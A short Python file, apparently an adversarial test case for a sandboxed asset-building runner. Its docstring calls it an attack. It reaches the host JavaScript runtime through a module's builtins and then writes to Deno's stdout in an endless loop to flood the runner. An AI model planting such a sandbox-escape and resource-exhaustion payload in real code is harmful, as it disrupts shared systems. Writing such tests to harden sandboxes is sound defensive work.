"""Attack: flood the runner stdout through the Deno handle."""

import wave

js = wave.builtins.__import__("js")


def build_assets(spec, character, canvas, seed):
    chunk = js.Uint8Array.new(65536)
    while True:
        js.Deno.stdout.writeSync(chunk)
